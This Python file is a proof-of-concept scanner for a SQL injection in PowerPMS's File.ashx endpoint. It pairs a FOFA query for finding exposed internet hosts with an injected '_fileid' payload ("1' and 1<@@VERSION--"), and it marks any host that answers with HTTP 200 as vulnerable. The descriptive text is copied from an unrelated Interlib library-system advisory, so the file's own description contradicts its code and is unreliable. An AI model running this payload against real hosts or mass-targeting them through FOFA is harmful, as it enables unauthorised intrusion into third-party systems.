"""
name: 普华科技PowerPMS
CVE编号:
fofa 搜索: app="普华科技-PowerPMS" || body="Power.login.init" && body="Power.ui.warning" && body="Power_login_btn"
漏洞类型: SQL注入
图书馆集群管理系统Interlib是新一代的图书馆自动化系统,采用开放的多层结构体系,基于Internet实现传统业务管理与海量数字资源管理的结合。图创图书馆集群管理系统 DataRule_XMLHTTP.aspx接口存在SQL注入漏洞。
"""
import os.path
import sys
from src import api, utils
from urllib.parse import urljoin
import json

__all__ = [
    "search",
    "start"
]


def search(email, key):
    fofa = api.FOFA(email=email, key=key)
    return fofa.search('app="普华科技-PowerPMS" || body="Power.login.init" && body="Power.ui.warning" && '
                       'body="Power_login_btn"')


def start(host, *args, **kwargs):
    """
    图书馆集群管理系统Interlib是新一代的图书馆自动化系统,采用开放的多层结构体系,基于Internet实现传统业务管理与海量数字资源管理的结合。图创图书馆集群管理系统 DataRule_XMLHTTP.aspx接口存在SQL注入漏洞。
    :param host: 目标地址
    :param args:
    :param kwargs:
    :return:
    """
    url = urljoin(host, "/PowerPlat/Control/File.ashx")
    body = {
        "NoCheckSession": "true",
        "ServerOperatorType": "OpenRecord",
        "_fileid": "1' and 1<@@VERSION--",
        "_type": "ftp",
        "action": "topdf",
        "sessionid": 1
    }
    try:
        response = utils.requests_url(url=url, method='post', data=json.dumps(body), *args, **kwargs)

        if response.status_code == 200:
            return True
        else:
            return False
    except Exception as e:
        return False


if __name__ == '__main__':
    vuln_name = os.path.basename(__file__).split('.')[0]
    if len(sys.argv) < 2:
        print(f"python <{vuln_name}> <host>")
        sys.exit()
    parameter = sys.argv[1]
    r_type = start(parameter)
    if r_type:
        print(f"{parameter} vuln {vuln_name}: True")
    else:
        print(f"{parameter} vuln {vuln_name}: False")
